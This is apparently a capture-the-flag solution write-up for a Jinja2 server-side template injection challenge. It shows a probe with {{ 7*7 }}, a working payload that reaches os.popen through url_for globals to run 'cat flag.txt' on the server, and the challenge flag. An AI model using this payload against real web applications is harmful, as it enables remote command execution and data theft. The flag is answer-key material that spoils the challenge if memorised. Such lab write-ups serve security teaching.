# Solution

1. Use the hint in the website "?exploit= param to…" to browse the website with "http://URL/?exploit={{ 7*7 }}".
* There will be a number 49 in the "Output viewer". This shows there is a SSTI vulnerability.

2. Replace {{ 7*7 }} with the following code.
```
{{url_for.__globals__.os.popen(request.args.a).read()}}&a=cat flag.txt
```
3. The "Output viewer" will show the flag:
```YCEP24{s$1i_J1nj42_1n7eC7i0n_jsj9nn39a2}```

Flag: ```YCEP24{s$1i_J1nj42_1n7eC7i0n_jsj9nn39a2}```